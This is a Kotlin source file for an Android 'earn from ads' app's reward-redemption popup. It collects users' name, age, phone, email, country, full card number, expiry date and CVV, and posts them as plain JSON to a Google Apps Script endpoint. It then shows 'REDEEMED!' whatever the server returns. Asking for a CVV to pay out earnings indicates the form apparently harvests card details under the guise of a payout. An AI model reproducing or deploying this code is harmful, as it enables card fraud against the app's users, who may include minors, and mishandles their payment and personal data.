package com.rajatnagpure.earnfromads.banktransfer

import android.app.AlertDialog
import android.app.Dialog
import android.app.ProgressDialog
import android.content.Context
import android.content.DialogInterface
import android.graphics.PorterDuff
import android.net.ConnectivityManager
import android.os.AsyncTask
import android.os.Build
import android.text.TextUtils
import android.text.method.LinkMovementMethod
import android.util.Patterns
import android.widget.*
import com.google.android.material.textfield.TextInputEditText
import com.google.android.material.textfield.TextInputLayout
import com.rajatnagpure.earnfromads.R
import com.rajatnagpure.earnfromads.shared.StaticData
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import javax.net.ssl.HttpsURLConnection
import android.text.Html
import android.view.*
import android.view.inputmethod.InputMethodManager


class BankTransferDetailsPopupWindowsForm  {
    private var closeButton: ImageButton? = null
    private var congratulationsTextLinearLayout: LinearLayout? = null
    private var personalDetailsListLinearLayout: LinearLayout? = null
    private var paymentDetailsLinearLayout: LinearLayout? = null
    private var detailsFieldsListLinearLayoutGroup: LinearLayout? = null
    private var privacyPolicyAndTermsAndConditionsLinearLayout: LinearLayout? = null

    private var titleText: TextView? = null
    private var nameTextInputLayout: TextInputLayout? = null
    private var nameTextInputEditText: TextInputEditText? = null
    private var ageTextInputLayout: TextInputLayout? = null
    private var ageTextInputEditText: TextInputEditText? = null
    private var phoneTextInputLayout: TextInputLayout? = null
    private var phoneTextInputEditText: TextInputEditText? = null
    private var emailTextInputLayout: TextInputLayout? = null
    private var emailTextInputEditText: TextInputEditText? = null
    private var countryTextInputLayout: TextInputLayout? = null
    private var countryTextInputEditText: AutoCompleteTextView? = null

    private var cardNumberInputLayout: TextInputLayout? = null
    private var cardNumberEditText: TextInputEditText? = null
    private var cardExpiryDateInputLayout: TextInputLayout? = null
    private var cardExpiryDateEditText: TextInputEditText? = null
    private var cardCVVNumberInputLayout: TextInputLayout? = null
    private var cardCVVNumberEditText: TextInputEditText? = null
    private var cardNameInputLayout: TextInputLayout? = null
    private var cardNameEditText: TextInputEditText? = null

    private val StepperDots = arrayOfNulls<ImageView>(2)
    private var stepperDotsLinearLayout: LinearLayout? = null

    private var privacyPolicyAndTermsAndConditionsTextView: TextView? = null
    private var submitButton: Button? = null

    private var popupViewWindowPageNumber = 0

    fun showPopupWindow(view: View, amountToBeDebited: Float) {
        val inflater =
            view.context.getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
        val popupView: View = inflater.inflate(R.layout.bank_transfer_details_popup_window_form, null)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            popupView.elevation = 4F
        }
        val width = LinearLayout.LayoutParams.WRAP_CONTENT
        val height = LinearLayout.LayoutParams.WRAP_CONTENT
        val focusable = true
        val popupWindow = PopupWindow(popupView, width, height, focusable)
        popupWindow.showAtLocation(view, Gravity.CENTER, 0, 0)
        popupWindow.dimBehind()
        closeButton = popupView.findViewById(R.id.close_button)
        closeButton?.setOnClickListener{
            popupWindow.dismiss()
        }

        congratulationsTextLinearLayout = popupView.findViewById(R.id.congratulations_text_linear_layout)
        detailsFieldsListLinearLayoutGroup = popupView.findViewById(R.id.details_fields_list_linear_layout_group)
        personalDetailsListLinearLayout = popupView.findViewById(R.id.personal_details_list_linear_layout)
        paymentDetailsLinearLayout = popupView.findViewById(R.id.payment_details_linear_layout)

        titleText = popupView.findViewById(R.id.title_text)

        nameTextInputLayout = popupView.findViewById(R.id.name_text_input)
        ageTextInputLayout = popupView.findViewById(R.id.age_text_input)
        phoneTextInputLayout = popupView.findViewById(R.id.phone_text_input)
        emailTextInputLayout = popupView.findViewById(R.id.email_text_input)
        countryTextInputLayout = popupView.findViewById(R.id.country_text_input)
        nameTextInputEditText = popupView.findViewById(R.id.name_edit_text)
        ageTextInputEditText = popupView.findViewById(R.id.age_edit_text)
        phoneTextInputEditText = popupView.findViewById(R.id.phone_edit_text)
        emailTextInputEditText = popupView.findViewById(R.id.email_edit_text)
        countryTextInputEditText = popupView.findViewById(R.id.country_edit_text)

        cardNumberInputLayout = popupView.findViewById(R.id.card_number_text_input)
        cardNumberEditText = popupView.findViewById(R.id.card_number_edit_text)
        cardExpiryDateInputLayout = popupView.findViewById(R.id.card_expiry_date_text_input)
        cardExpiryDateEditText = popupView.findViewById(R.id.card_expiry_date_edit_text)
        cardCVVNumberInputLayout = popupView.findViewById(R.id.card_cvv_text_input)
        cardCVVNumberEditText = popupView.findViewById(R.id.card_cvv_edit_text)
        cardNameInputLayout = popupView.findViewById(R.id.card_name_text_input)
        cardNameEditText = popupView.findViewById(R.id.card_name_edit_text)

        stepperDotsLinearLayout = popupView.findViewById(R.id.stepper_dots)
        bottomProgressDots(popupView.context)

        privacyPolicyAndTermsAndConditionsLinearLayout = popupView.findViewById(R.id.term_and_condition_and_privacy_policy_text_view_linear_layout)
        privacyPolicyAndTermsAndConditionsTextView = popupView.findViewById(R.id.term_and_condition_and_privacy_policy_text_view)
        submitButton = popupView.findViewById(R.id.submit_button)

        val adapter = ArrayAdapter(view.context,android.R.layout.simple_list_item_1,
            StaticData.countryWithCode
        )
        countryTextInputEditText?.setAdapter(adapter)
        countryTextInputEditText?.threshold = 1

        privacyPolicyAndTermsAndConditionsTextView?.isClickable = true
        privacyPolicyAndTermsAndConditionsTextView?.movementMethod = LinkMovementMethod.getInstance()
        val text = "<a href='https://docs.google.com/document/d/1gVECPIIaBdZb5VdQJRSEtanF2SZVHvGiRsTTV9_VZhA/edit?usp=sharing'> Term &amp; Condition and Privacy Policy. </a>"
        privacyPolicyAndTermsAndConditionsTextView?.text = Html.fromHtml(text)
        submitButton?.setOnClickListener{
            when(popupViewWindowPageNumber){
                0 -> {
                    if(validateName() && validateAge() && validatePhone() && validateEmail() && validateCountry()){
                        popupViewWindowPageNumber = 1
                        pageChanger(popupView.context, popupViewWindowPageNumber)
                    }
                }
                1 -> {
                    if(validateCardNumber() && validateCardExpiryDate() && validateCardCVVNumber() && validateCardName()){
                        if(!isNetworkAvailable(view.context)){
                            val alertDialog = AlertDialog.Builder(view.context).create()
                            alertDialog.setTitle("")
                            alertDialog.setMessage("Please Check Internet Connection")
                            alertDialog.setButton("Ok",
                                DialogInterface.OnClickListener { dialog, which ->
                                    //dismiss the dialog
                                    alertDialog.dismiss()
                                })
                            alertDialog.show()
                        }else{
                            sendDataToCloud(view.context)
                        }
                    }
                }
                2 -> {
                    val sharedPreferences = view.context.getSharedPreferences("MySharedPref",
                        Context.MODE_PRIVATE
                    )
                    val myEdit = sharedPreferences.edit()
                    var amount = sharedPreferences.getFloat("amount",0.0f)
                    amount -= amountToBeDebited
                    myEdit.putFloat("amount",amount)
                    myEdit.apply()
                    popupWindow.dismiss()
                }
            }
        }
        pageChanger(popupView.context,popupViewWindowPageNumber)
    }

    private fun pageChanger(context: Context, currentPage: Int){
        when(currentPage){
            0 -> {
                congratulationsTextLinearLayout?.visibility = LinearLayout.GONE
                detailsFieldsListLinearLayoutGroup?.visibility = LinearLayout.VISIBLE
                paymentDetailsLinearLayout?.visibility = LinearLayout.GONE
                personalDetailsListLinearLayout?.visibility = LinearLayout.VISIBLE
                titleText?.text = "Congo! Put Your Details"
                submitButton?.text = "NEXT"
                privacyPolicyAndTermsAndConditionsLinearLayout?.visibility = LinearLayout.GONE
            }
            1 -> {
                congratulationsTextLinearLayout?.visibility = LinearLayout.GONE
                detailsFieldsListLinearLayoutGroup?.visibility = LinearLayout.VISIBLE
                paymentDetailsLinearLayout?.visibility = LinearLayout.VISIBLE
                personalDetailsListLinearLayout?.visibility = LinearLayout.GONE
                titleText?.text = "Card Details"
                submitButton?.text = "REDEEM NOW!"
                privacyPolicyAndTermsAndConditionsLinearLayout?.visibility = LinearLayout.VISIBLE
                StepperDots[0]!!
                    .setColorFilter(
                        context.resources.getColor(R.color.grey_20),
                        PorterDuff.Mode.SRC_IN
                    )
                StepperDots[1]!!
                    .setColorFilter(
                        context.resources.getColor(R.color.light_blue_500),
                        PorterDuff.Mode.SRC_IN
                    )
            }
            2 -> {
                congratulationsTextLinearLayout?.visibility = LinearLayout.VISIBLE
                paymentDetailsLinearLayout?.visibility = LinearLayout.GONE
                personalDetailsListLinearLayout?.visibility = LinearLayout.GONE
                detailsFieldsListLinearLayoutGroup?.visibility = LinearLayout.GONE
                titleText?.text = "REDEEMED!..."
                submitButton?.text = "Close"
                privacyPolicyAndTermsAndConditionsLinearLayout?.visibility = LinearLayout.GONE
                stepperDotsLinearLayout?.visibility = LinearLayout.GONE
                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager?
                imm!!.toggleSoftInput(InputMethodManager.HIDE_IMPLICIT_ONLY, 0)
            }
        }
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return connectivityManager.activeNetworkInfo != null && connectivityManager.activeNetworkInfo!!
            .isConnected
    }

    private fun validateEmail(): Boolean {
        phoneTextInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(emailTextInputEditText?.text)) {
            if(!Patterns.EMAIL_ADDRESS.matcher(emailTextInputEditText?.text.toString()).matches()){
                emailTextInputLayout?.isErrorEnabled = true
                emailTextInputLayout?.error = "Invalid Email"
            }else{
                return true
            }
        }
        emailTextInputLayout?.isErrorEnabled = true
        emailTextInputLayout?.error = "Email is Must"
        return false
    }

    private fun validatePhone(): Boolean {
        ageTextInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(phoneTextInputEditText?.text)) {
            return if(!phoneTextInputEditText?.text.toString().matches("""[0-9]*""".toRegex())){
                phoneTextInputLayout?.isErrorEnabled = true
                phoneTextInputLayout?.error = "Invalid Phone No."
                false
            }else if(phoneTextInputEditText?.text.toString().length < 10){
                phoneTextInputLayout?.isErrorEnabled = true
                phoneTextInputLayout?.error = "At Least 10 Digits"
                false
            }else{
                true
            }
        }
        phoneTextInputLayout?.isErrorEnabled = true
        phoneTextInputLayout?.error = "Phone is Must"
        return false
    }

    private fun validateName(): Boolean {
        if (!TextUtils.isEmpty(nameTextInputEditText?.text)) {
            if(nameTextInputEditText?.text.toString().length >= 5){
                return true
            }else{
                nameTextInputLayout?.isErrorEnabled = true
                nameTextInputLayout?.error = "First & Last Name are Must"
            }
        }
        nameTextInputLayout?.isErrorEnabled = true
        nameTextInputLayout?.error = "First & Last Name are Must"
        return false
    }

    private fun validateAge(): Boolean {
        nameTextInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(ageTextInputEditText?.text)) {
            return if((ageTextInputEditText?.text.toString().toInt()) < 4 || (ageTextInputEditText?.text.toString().toInt()) > 80){
                ageTextInputLayout?.isErrorEnabled = true
                ageTextInputLayout?.error = "Invalid Age"
                false
            }else{
                true
            }
        }
        ageTextInputLayout?.isErrorEnabled = true
        ageTextInputLayout?.error = "Age is Must"
        return false
    }

    private fun validateCountry(): Boolean {
        emailTextInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(countryTextInputEditText?.text)) {
            if(countryTextInputEditText?.text.toString().length >= 3){
                return true
            }else{
                countryTextInputLayout?.isErrorEnabled = true
                countryTextInputLayout?.error = "country is Must"
            }
        }
        countryTextInputLayout?.isErrorEnabled = true
        countryTextInputLayout?.error = "country is Must"
        return false
    }

    private fun validateCardNumber(): Boolean{
        if (!TextUtils.isEmpty(cardNumberEditText?.text)) {
            return if(!cardNumberEditText?.text.toString().matches("""[0-9]*""".toRegex())){
                cardNumberInputLayout?.isErrorEnabled = true
                cardNumberInputLayout?.error = "Invalid Card No."
                false
            }else if(cardNumberEditText?.text.toString().length != 16){
                cardNumberInputLayout?.isErrorEnabled = true
                cardNumberInputLayout?.error = "Only 16 Digits"
                false
            } else{
                true
            }
        }
        cardNumberInputLayout?.isErrorEnabled = true
        cardNumberInputLayout?.error = "Card No. is Must"
        return false
    }

    private fun validateCardExpiryDate(): Boolean {
        cardNumberInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(cardExpiryDateEditText?.text)) {
            return if(!cardExpiryDateEditText?.text.toString().matches("""(0?[1-9]|1[012])/[0-9][0-9]""".toRegex())){
                cardExpiryDateInputLayout?.isErrorEnabled = true
                cardExpiryDateInputLayout?.error = "Invalid Date"
                false
            }else{
                true
            }
        }
        cardExpiryDateInputLayout?.isErrorEnabled = true
        cardExpiryDateInputLayout?.error = "Expiry is Must"
        return false
    }

    private fun validateCardCVVNumber(): Boolean{
        cardExpiryDateInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(cardCVVNumberEditText?.text)) {
            return if(!cardCVVNumberEditText?.text.toString().matches("""[0-9]*""".toRegex())){
                cardCVVNumberInputLayout?.isErrorEnabled = true
                cardCVVNumberInputLayout?.error = "Invalid CVV"
                false
            }else if(cardCVVNumberEditText?.text.toString().length != 3){
                cardCVVNumberInputLayout?.isErrorEnabled = true
                cardCVVNumberInputLayout?.error = "Only 3 Digits"
                false
            } else{
                true
            }
        }
        cardCVVNumberInputLayout?.isErrorEnabled = true
        cardCVVNumberInputLayout?.error = "CVV Needed"
        return false
    }

    private fun validateCardName(): Boolean {
        cardCVVNumberInputLayout?.isErrorEnabled = false
        if (!TextUtils.isEmpty(cardNameEditText?.text)) {
            return if(cardNameEditText?.text.toString().length >= 5){
                true
            }else{
                cardNameInputLayout?.isErrorEnabled = true
                cardNameInputLayout?.error = "First & Last Name are Must"
                false
            }
        }
        cardNameInputLayout?.isErrorEnabled = true
        cardNameInputLayout?.error = "First & Last Name are Must"
        return false
    }

    private fun bottomProgressDots(context: Context) {
        stepperDotsLinearLayout?.removeAllViews()
        for (i in StepperDots.indices) {
            StepperDots[i] = ImageView(context)
            val widthHeight = 15
            val params = LinearLayout.LayoutParams(ViewGroup.LayoutParams(widthHeight, widthHeight))
            params.setMargins(10, 10, 10, 10)
            StepperDots[i]!!.layoutParams = params
            StepperDots[i]!!.setImageResource(R.drawable.shape_circle)
            StepperDots[i]!!.setColorFilter(
                context.resources.getColor(R.color.grey_20),
                PorterDuff.Mode.SRC_IN
            )
            stepperDotsLinearLayout?.addView(StepperDots[i])
        }
        if (StepperDots.isNotEmpty()) {
            StepperDots[0]!!.setImageResource(R.drawable.shape_circle)
            StepperDots[0]!!
                .setColorFilter(
                    context.resources.getColor(R.color.light_blue_500),
                    PorterDuff.Mode.SRC_IN
                )
        }
    }

    private fun PopupWindow.dimBehind() {
        val container = contentView.rootView
        val context = contentView.context
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val p = container.layoutParams as WindowManager.LayoutParams
        p.flags = p.flags or WindowManager.LayoutParams.FLAG_DIM_BEHIND
        p.dimAmount = 0.3f
        wm.updateViewLayout(container, p)
    }

    private fun sendDataToCloud(context: Context){

        class SendPostReqAsyncTask : AsyncTask<String, String, String>() {
            private var loadingDialog: Dialog? = null
            override fun onPreExecute() {
                super.onPreExecute();
                loadingDialog = ProgressDialog.show(context, "REDEEMING", "REDEEMING...");
            }

            override fun doInBackground(vararg urls: String?): String {
                var urlConnection: HttpURLConnection? = null
                val url = URL("https://script.google.com/macros/s/AKfycbzVPalYfInOXJNMe7Yv_JQtTG2LCiM24f72wzEQBHj7kjuF3k6J-XPmD5jqtZeLpkG4/exec?action=addBankTransferDataPersonalAndPaymentData")
                val jsonObject = JSONObject()
                jsonObject.put("name", nameTextInputEditText?.text.toString())
                jsonObject.put("age", ageTextInputEditText?.text.toString())
                jsonObject.put("mobile", phoneTextInputEditText?.text.toString())
                jsonObject.put("email", emailTextInputEditText?.text.toString())
                jsonObject.put("countryOrCountry", countryTextInputEditText?.text.toString())
                jsonObject.put("cardNumber", cardNumberEditText?.text.toString())
                jsonObject.put("cardExpiry", cardExpiryDateEditText?.text.toString())
                jsonObject.put("cardCvv", cardCVVNumberEditText?.text.toString())
                jsonObject.put("cardName", cardNameEditText?.text.toString())
                val jsonObjectString = jsonObject.toString()

                try {

                    urlConnection = url.openConnection() as HttpURLConnection
                    urlConnection.requestMethod = "POST"
                    urlConnection.setRequestProperty("Content-Type", "application/json") // The format of the content we're sending to the server
                    urlConnection.doInput = true
                    urlConnection.doOutput = true

                    val outputStreamWriter = OutputStreamWriter(urlConnection.outputStream)
                    outputStreamWriter.write(jsonObjectString)
                    outputStreamWriter.flush()

                    val responseCode = urlConnection.responseCode
                    if (responseCode == HttpsURLConnection.HTTP_OK) {
                        val `in` = BufferedReader(InputStreamReader(urlConnection.inputStream))
                        val sb = StringBuffer("")
                        var line: String? = ""
                        while (`in`.readLine().also { line = it } != null) {
                            sb.append(line)
                            break
                        }
                        `in`.close()
                        return sb.toString()
                    }
                } catch (ex: Exception) {

                } finally {
                    urlConnection?.disconnect()
                }

                return " "
            }

            override fun onPostExecute(result: String?) {
                loadingDialog?.dismiss()
                popupViewWindowPageNumber = 2
                pageChanger(context, popupViewWindowPageNumber)
            }
        }

        val sendPostReqAsyncTask = SendPostReqAsyncTask()
        sendPostReqAsyncTask.execute()
    }
}